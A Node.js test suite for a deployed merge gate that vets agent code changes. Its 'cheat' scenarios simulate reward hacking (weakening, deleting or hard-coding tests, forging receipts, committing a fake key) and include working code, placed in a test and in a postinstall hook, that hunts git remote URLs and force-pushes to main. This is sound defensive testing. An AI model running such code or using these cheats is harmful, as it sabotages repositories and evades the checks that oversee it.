// The lander's gate suite, run against the DEPLOYED lander on real Artifacts (same cases as
// lander.test.mjs). Usage: node test/cloud-scenarios.mjs <worker-url>   (uses the cinq login, ~/.cinq/config.json)
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { homedir } from 'node:os';

const URL_ = process.argv[2] || JSON.parse(readFileSync(join(homedir(), '.cinq', 'config.json'), 'utf8')).url; // default: the deployment you're logged in to
const KEY = JSON.parse(readFileSync(join(homedir(), '.cinq', 'config.json'), 'utf8')).ownerKey;
const SP = join(import.meta.dirname, 'fixtures');
const tree = (dir) => { const out = {}; const walk = (d, pre) => { for (const e of readdirSync(d, { withFileTypes: true })) { if (e.isDirectory()) walk(join(d, e.name), `${pre}${e.name}/`); else out[`${pre}${e.name}`] = readFileSync(join(d, e.name), 'utf8'); } }; walk(dir, ''); return out; };
const s2 = tree(join(SP, 's2', 'fixture', 'trunk'));
const I = (id, f) => readFileSync(join(SP, 's2', 'intents', id, f), 'utf8');
const i2 = { id: 'i2-negative-money', allowed: ['src/format.js'], ownTests: ['test/intent-i2-negative-money.test.js'], hidden: { 'test/intent-i2-negative-money.hidden.test.js': I('i2-negative-money', 'hidden.test.js') } };
const own = { 'test/intent-i2-negative-money.test.js': I('i2-negative-money', 'frozen.test.js') };
const good = `export function formatMoney(amount) {\n  const sign = amount < 0 ? '-' : '';\n  const [whole, frac] = Math.abs(amount).toFixed(2).split('.');\n  return sign + '$' + whole.replace(/\\B(?=(\\d{3})+(?!\\d))/g, ',') + '.' + frac;\n}\n`;
const one = (name, writes, deletes, expect, seed = s2, intent = i2) => ({ name, expect, seed: { files: seed }, steps: [{ fork: 'a' }, { apply: 'a', writes, deletes }, { land: 'a', name, intent }] });

const { intents } = await import(new URL(`file:///${join(SP, 's3-relay', 'intents-day2.mjs').replace(/\\/g, '/')}`));
const by = Object.fromEntries(intents.map((i) => [i.id, i]));
const day2 = tree(join(SP, 's3-relay', 'base-day2'));
const tp = by['tax-percent'];

// A small vitest project (the lander installs deps in the container and reads vitest's JSON report).
const vt = {
  'package.json': JSON.stringify({ name: 'vt', type: 'module', scripts: { test: 'vitest run' }, devDependencies: { vitest: '^3.2.4' } }, null, 2),
  'src/sum.js': 'export const sum = (a, b) => a + b;\n',
  'test/sum.test.js': "import { test, expect } from 'vitest';\nimport { sum } from '../src/sum.js';\ntest('sum', () => expect(sum(2, 3)).toBe(5));\n",
  'test/other.test.js': "import { test, expect } from 'vitest';\ntest('other', () => expect(1).toBe(1));\n",
};
const vtIntent = { id: 'mul', allowed: ['src/sum.js'], ownTests: ['test/mul.test.js'], tests: { 'test/mul.test.js': "import { test, expect } from 'vitest';\nimport { mul } from '../src/sum.js';\ntest('mul', () => expect(mul(2, 3)).toBe(6));\n" } };

// Cheats: agent code that hunts for the trunk token and tries to push main. Both must be refused and main must
// not move (checked with a `head` step after the landing).
const pushAttempt = `
const { execFileSync } = require('node:child_process');
const fs = require('node:fs'); const path = require('node:path'); const os = require('node:os');
function harvest() {
  const urls = new Set();
  const look = (d, depth) => { if (depth > 6) return; let es = []; try { es = fs.readdirSync(d, { withFileTypes: true }); } catch { return; }
    for (const e of es) { const p = path.join(d, e.name);
      if (e.isFile() && e.name === 'config') { try { for (const m of fs.readFileSync(p, 'utf8').matchAll(/url = (\\S+)/g)) urls.add(m[1]); } catch {} }
      else if (e.isDirectory() && e.name !== 'objects' && e.name !== 'node_modules') look(p, depth + 1); } };
  look('/tmp', 0); look(path.resolve('..'), 0);
  return [...urls].filter((u) => u.startsWith('http'));
}
function tryPush() {
  const w = fs.mkdtempSync(path.join(os.tmpdir(), 'evil-'));
  const g = (...a) => execFileSync('git', ['-c', 'user.name=evil', '-c', 'user.email=e@e', ...a], { windowsHide: true, cwd: w, stdio: 'pipe', env: { ...process.env, GIT_TERMINAL_PROMPT: '0' } });
  g('init', '-q', '-b', 'main'); fs.writeFileSync(path.join(w, 'owned.txt'), 'owned'); g('add', '-A'); g('commit', '-qm', 'owned');
  for (const u of harvest()) { try { g('push', '-q', '-f', u, 'HEAD:main'); return true; } catch {} }
  return false;
}
`;
const pushTest = `const { test } = require('node:test');\nconst assert = require('node:assert/strict');\n${pushAttempt}\ntest('push to main', () => assert.ok(tryPush(), 'could not push'));\n`;
const evil = {
  'package.json': JSON.stringify({ name: 's2', type: 'module', scripts: { postinstall: 'node scripts/evil.cjs' }, dependencies: { tiny: 'file:./vendor/tiny' } }, null, 2),
  'vendor/tiny/package.json': JSON.stringify({ name: 'tiny', version: '1.0.0', main: 'index.js' }), 'vendor/tiny/index.js': 'module.exports = 1;\n',
  'scripts/evil.cjs': `${pushAttempt}\nrequire('node:fs').writeFileSync('pwned.txt', String(tryPush()));\n`,
  'test/pwned.test.js': "import { test } from 'node:test';\nimport assert from 'node:assert/strict';\nimport { existsSync } from 'node:fs';\ntest('install script ran', () => assert.ok(existsSync('pwned.txt')));\n",
};
const cheatM1 = (name, writes, extraAllowed) => ({ name, expect: 'red', unchanged: true, seed: { files: s2 }, steps: [{ fork: 'a' }, { apply: 'a', writes: { ...own, 'src/format.js': good, ...writes } },
  { land: 'a', name, intent: { ...i2, allowed: ['src/format.js', ...extraAllowed], ownTests: [...i2.ownTests, ...extraAllowed.filter((p) => p.startsWith('test/'))], deps: ['tiny'] } }, { head: true }] });

const scenarios = [
  { name: 'vitest: correct change lands', expect: 'landed', seed: { files: vt }, steps: [{ fork: 'a' }, { apply: 'a', writes: { 'src/sum.js': vt['src/sum.js'] + 'export const mul = (a, b) => a * b;\n' } }, { land: 'a', name: 'vitest ok', intent: vtIntent }] },
  { name: 'vitest: breaking change is red, failing file named', expect: 'red', seed: { files: vt }, steps: [{ fork: 'a' }, { apply: 'a', writes: { 'src/sum.js': 'export const sum = (a, b) => a - b;\nexport const mul = (a, b) => a * b;\n' } }, { land: 'a', name: 'vitest red', intent: vtIntent }] },
  one('correct change lands', { ...own, 'src/format.js': good }, [], 'landed'),
  one('cheat: weaken a trunk test', { ...own, 'src/format.js': good, 'test/cart.test.js': s2['test/cart.test.js'].replace("'$1,234,567.50'", () => 'formatMoney(1234567.5)') }, [], 'rejected'),
  one('cheat: hard-code the test input', { ...own, 'src/format.js': s2['src/format.js'].replace('export function formatMoney(amount) {', () => "export function formatMoney(amount) {\n  if (amount === -3.5) return '-$3.50';") }, [], 'red'),
  one('cheat: edit outside footprint', { ...own, 'src/format.js': good, 'src/money.js': s2['src/money.js'] + '\nexport const x = 1;\n' }, [], 'rejected'),
  one('cheat: delete a trunk test', { ...own, 'src/format.js': good }, ['test/cart.test.js'], 'rejected'),
  one('cheat: forge a receipt in .cinq/', { ...own, 'src/format.js': good, '.cinq/receipts/other.json': '{"forged":true}' }, [], 'rejected'),
  one('cheat: hand in nothing', { ...own }, [], 'noop'),
  one('zero tests ran is never green', { 'src/a.js': 'export const a = 2;\n' }, [], 'red', { 'package.json': '{"type":"module"}', 'src/a.js': 'export const a = 1;\n' }, { id: 'a', allowed: ['src/a.js'] }),
  { name: 'stale collision is a conflict', expect: 'conflict', seed: { files: s2 }, steps: [
    { fork: 'stale' }, { fork: 'other' },
    { apply: 'other', writes: { 'src/format.js': good.replace("'$'", () => "'$' /* landed first */") } },
    { land: 'other', name: 'other lands first', intent: { id: 'other', allowed: ['src/format.js'] } },
    { apply: 'stale', writes: { ...own, 'src/format.js': "export function formatMoney(amount) {\n  return (amount < 0 ? '-$' : '$') + Math.abs(amount).toFixed(2);\n}\n" } },
    { land: 'stale', name: 'stale collision is a conflict', intent: i2 }] },
  cheatM1('cheat: a test pushes to main', { 'test/push.test.cjs': pushTest }, ['test/push.test.cjs']),
  cheatM1('cheat: a postinstall script pushes to main', evil, Object.keys(evil)),
  // security gates
  one('cheat: commit a secret', { ...own, 'src/format.js': good.replace('export function', () => `const KEY = '${'AKIA' + 'Q3EXAMPLE7H2K9LZ'}';\nexport function`) }, [], 'rejected'),
  one('cheat: undeclared dependency', { ...own, 'src/format.js': good, 'package.json': JSON.stringify({ name: 's2', type: 'module', dependencies: { tiny: 'file:./vendor/tiny' } }), 'vendor/tiny/package.json': '{"name":"tiny","version":"1.0.0"}' }, [], 'rejected', s2, { ...i2, allowed: ['src/format.js', 'package.json', 'vendor/tiny/package.json'] }),
  one('cheat: touch a protected path', { ...own, 'src/format.js': good, '.github/workflows/ci.yml': 'on: push\n' }, [], 'parked', s2, { ...i2, allowed: ['src/format.js', '.github/workflows/ci.yml'] }),
  one('cheat: over the diff budget', { ...own, 'src/format.js': good + Array.from({ length: 10 }, (_, i) => `export const c${i} = ${i};`).join('\n') + '\n' }, [], 'parked', { ...s2, '.cinq/config.json': '{"diffBudget":5}' }),
  { name: 'contract change breaks a landed intent', expect: 'breaks-dependents', seed: { files: day2 }, steps: [
    { fork: 'checkout' }, { fork: 'taxpct' },
    { apply: 'checkout', writes: { 'src/checkout.js': "import { total } from './cart.js';\nimport { withTax } from './tax.js';\nimport { shipping } from './shipping.js';\nexport const checkout = (items, taxRate) => Math.round((withTax(total(items), taxRate) + shipping(items)) * 100) / 100;\n", 'test/intent-checkout.test.js': by.checkout.frozen } },
    { land: 'checkout', name: 'checkout lands', intent: { id: 'checkout', allowed: ['src/checkout.js'], ownTests: ['test/intent-checkout.test.js'], hidden: { 'test/intent-checkout.hidden.test.js': by.checkout.hidden } } },
    { apply: 'taxpct', writes: { 'src/tax.js': day2['src/tax.js'].replace('withTax(amount, rate)', 'withTax(amount, ratePercent)').replace('rate < 0', 'ratePercent < 0').replace('(1 + rate)', '(1 + ratePercent / 100)'), 'test/intent-tax.test.js': tp.frozen, 'test/intent-tax.hidden.test.js': tp.hidden, 'test/intent-tax-percent.test.js': tp.frozen } },
    // the two existing tests it rewrites arrive as an APPROVED test change (intent.tests); allowed[] alone can't edit them
    { land: 'taxpct', name: 'contract change breaks a landed intent', intent: { id: 'tax-percent', allowed: tp.allowed, ownTests: ['test/intent-tax-percent.test.js'], tests: { 'test/intent-tax.test.js': tp.frozen, 'test/intent-tax.hidden.test.js': tp.hidden }, approvedSupersedes: ['test/intent-tax.test.js', 'test/intent-tax.hidden.test.js'], hidden: { 'test/intent-tax-percent.hidden.test.js': tp.hidden } },
      testOwners: { 'test/intent-checkout.test.js': 'checkout', 'test/intent-checkout.hidden.test.js': 'checkout' } }] },
];

const only = process.argv[3];
let pass = 0; let ran = 0;
for (const sc of scenarios) {
  if (only && !sc.name.includes(only)) continue; ran++;
  const t0 = Date.now();
  const res = await fetch(`${URL_}/dev/scenario`, { method: 'POST', headers: { authorization: `Bearer ${KEY}`, 'content-type': 'application/json' }, body: JSON.stringify({ seed: sc.seed, steps: sc.steps }) });
  const j = await res.json().catch(async () => ({ ok: false, error: `HTTP ${res.status}` }));
  const last = (j.results || []).filter((r) => r.step.startsWith('land')).at(-1) || {};
  const headNow = (j.results || []).filter((r) => r.step === 'head').at(-1)?.head;
  const ok = j.ok && last.verdict === sc.expect && (!sc.unchanged || (headNow && headNow === last.before));
  if (ok) pass++;
  const extra = (sc.unchanged ? ` main ${last.before}→${headNow}` : '') + (last.dependents?.length ? ` dependents=${last.dependents}` : last.failing?.length ? ` failing=${last.failing.join(',')}` : '');
  console.log(`${ok ? '✔' : '✖'} ${sc.name.padEnd(42)} → ${String(last.verdict).padEnd(18)} (expected ${sc.expect}) tests=${last.testsRun ?? '-'} land=${last.roundTripMs ?? '-'}ms total=${Date.now() - t0}ms${extra}${j.ok ? '' : ' ERROR ' + j.error}`);
}
console.log(`\n${pass}/${ran} scenarios matched on the deployed lander`);
process.exit(pass === ran ? 0 : 1);
